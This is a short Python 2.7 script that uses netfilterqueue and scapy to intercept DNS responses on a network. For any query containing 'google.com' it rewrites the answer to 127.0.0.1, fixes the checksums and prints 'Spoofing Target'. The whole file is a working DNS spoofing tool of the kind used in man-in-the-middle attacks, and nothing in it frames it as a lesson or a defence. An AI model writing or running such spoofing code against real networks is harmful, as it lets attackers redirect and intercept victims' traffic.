#!/usr/bin/python2.7

import netfilterqueue
import scapy.all as scapy

def process(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.DNSRR):
		qname = scapy_packet[scapy.DNSQR].qname
		if "google.com" in qname:
			answer = scapy.DNSRR(rrname=qname,rdata="127.0.0.1")
			scapy_packet[scapy.DNS].an = answer
			scapy_packet[scapy.DNS].ancount = 1
			del scapy_packet[scapy.IP].len
			del scapy_packet[scapy.IP].chksum
			del scapy_packet[scapy.UDP].len
			del scapy_packet[scapy.UDP].chksum
			packet.set_payload(str(scapy_packet))
			print "Spoofing Target",qname
	packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0,process)
queue.run()